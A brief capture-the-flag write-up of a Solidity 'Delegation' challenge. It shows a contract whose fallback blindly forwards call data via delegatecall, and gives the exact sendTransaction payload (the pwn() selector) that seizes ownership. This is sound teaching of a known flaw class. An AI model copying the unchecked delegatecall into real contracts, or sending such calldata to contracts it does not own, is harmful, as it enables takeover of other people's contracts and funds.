# Delegation Attack

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

```

### task

The challenge goal is to take ownership of the contract

### solution

This is a typical case of **delegatecall** vulnerability, we can simply execute the **pwn()** function, through the delegatecall of
the fallback function. All we need to do is set the data in msg.data to function signature, with 64 zeros padding to indicate no argument

### steps

```javascript
// in your browser console
// the 64 zeros padding is necessary

sendTransaction({
    from:your_address,
    to:contract_address,
    data:"0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
})

```
